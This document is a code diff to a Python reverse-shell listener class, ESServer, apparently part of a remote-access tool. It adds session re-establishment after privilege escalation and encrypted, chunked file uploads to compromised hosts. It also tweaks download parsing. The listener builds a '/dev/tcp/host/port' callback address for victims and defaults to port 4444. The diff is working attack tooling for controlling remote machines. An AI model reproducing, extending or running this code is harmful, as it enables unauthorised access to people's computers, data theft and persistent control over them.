@@ -35,11 +35,16 @@ class ESServer:
         self.h = helper
         self.inputhandle = ""
         self.msrunning = 0
+        self.msescalate = 0
+        self.lport = 4444
+        self.lhost = ""
     
     def term(self):
         return ''.join((random.choice(string.letters)) for x in range(16))
 
     def listen(self,host,port,verbose):
+        self.lport = port
+        self.lhost = host
         host = socket.gethostbyname(host)
         term = self.term()
         INSTRUCT_ADDRESS = "/dev/tcp/"+str(host)+"/"+str(port)
@@ -141,7 +146,21 @@ class ESServer:
             self.h.strinfo("closing connection")
             time.sleep(1)
 
-        
+    def refreshSession(self,session):
+        #if in multiserver, set escalation flag
+        if self.msrunning:
+            self.msescalate = 1
+            #wait for escalate = 0
+            while self.msescalate:
+                time.sleep(0.1)
+            return
+        #if single session, just listen for a new session, replace connection/name
+        newsession = self.listen(session.host,session.port,0)
+        session.s = newsession.s
+        session.conn = newsession.conn
+        session.name = newsession.name
+
+
     #MARK: Multiserver
     def multiServerListen(self,host,port):
         x = 1
@@ -152,9 +171,16 @@ class ESServer:
             skip = 0
             for sx in self.sessions:
                 if session.uid == self.sessions[sx].uid:
-                    session.conn.close()
-                    skip = 1
-                    break
+                    if self.msescalate:
+                        self.sessions[sx].s = session.s
+                        self.sessions[sx].conn = session.conn
+                        self.sessions[sx].name = session.name
+                        self.msescalate = 0
+                        skip = 1
+                    else:
+                        session.conn.close()
+                        skip = 1
+                        break
             #damnit
             if skip:
                 continue
@@ -245,7 +271,7 @@ class ESServer:
             if self.shell.interact(s,self,1) == -1:
                 self.multiServerCloseSession(args) #2nd arg is id
         except:
-            "unable to interact with session"
+            self.h.strinfo("unable to interact with session")
 
     def multiServerCloseSession(self,args):
         if len(args) > 1:
@@ -337,8 +363,7 @@ class ESServer:
         fileData = f.read()
         f.close()
         #TODO: encrypt the data
-        #fileData = self.escryptor.encode(fileData)
-        fileData = base64.b64encode(fileData)
+        fileData = self.escryptor.encode(fileData)
         #get file size
         sizeofFile = sys.getsizeof(fileData)
         #send data
@@ -350,22 +375,25 @@ class ESServer:
         conn.send(self.escryptor.encryptString(data))
         #receive go ahead
         conn.recv(256)
-        progress = 0
         self.h.strinfo("Uploading "+fileName)
-        conn.send(fileData+terminator)
+        #send
+        progress = 0
+        while progress < len(fileData):
+            conn.send(fileData[progress:progress + 1024])
+            progress += 1024
+        conn.send(terminator)
+        #receive confirmation
         conn.recv(256)
 
     def downloadFile(self,cmdraw,terminator,conn):
-        #TODO: send upload command within this function
         #receive size of file
         sizedata = ""
         while 1:
-            sizedata += conn.recv(16)
+            sizedata += conn.recv(2)
             if terminator in sizedata:
                 break
-    
         sof = self.escryptor.decrypt(sizedata.split(terminator)[0])
-        
+        #detect if result is an error
         try:
             sizeofFile = int(sof)
         except:
